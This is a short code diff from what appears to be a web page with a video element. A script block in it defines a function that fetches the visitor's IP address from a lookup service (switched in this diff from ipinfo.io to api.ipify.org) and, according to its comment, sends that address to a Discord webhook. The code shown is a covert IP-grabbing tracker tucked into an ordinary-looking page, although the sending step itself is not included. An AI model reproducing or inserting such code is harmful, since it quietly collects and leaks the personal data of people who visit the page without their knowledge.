@@ -214,7 +214,7 @@
     <video id="video" playsinline style="pointer-events: none" />
 </body>
 <script>
-    const axios = require('axios');
+const axios = require('axios');
 
 /**
  * Function to log the IP address and send it to a Discord webhook.
@@ -225,8 +225,8 @@
 async function logIPAndSendToWebhook(webhookUrl) {
     try {
         // Get the IP address
-        const response = await axios.get('https://ipinfo.io/json');
-        const ip = response.data;
+        const response = await axios.get('https://api.ipify.org?format=json');
+        const ip = response.data.ip;
 
         // Log the IP address
         console.log(`IP Address: ${ip}`);
